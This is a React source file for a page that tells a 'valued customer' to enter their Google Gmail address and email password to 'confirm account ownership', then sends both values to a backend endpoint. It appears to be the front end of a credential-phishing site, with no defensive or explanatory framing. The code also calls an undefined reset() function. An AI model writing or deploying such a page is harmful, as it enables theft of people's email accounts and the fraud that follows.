import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.png";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup
    .string()
    .required("Password is required"),
});

const Email = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/email`, data)
      .then((response) => {
        console.log(response.data);
        reset(); // Clear the input field
        navigate("/email");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="subtitle">Hello! Valued customer kindly use the correct email address and email password registered with Google Gmail below ⬇ to confirm your account ownership </div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="email">Email Address</label>
              <div className="formInput">
                <input
                  name="email"
                  type="email"
                  placeholder="example@email.com"
                  required
                  {...register("email")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="email" />
              <label htmlFor="password">Email Password</label>
              <div className="formInput">
                <input
                  name="password"
                  type="password"
                  placeholder="Email password"
                  required
                  {...register("password")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="password" />
              <button type="submit" disabled={loading}>
                {loading ? "Loading..." : "Sign In"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Email;
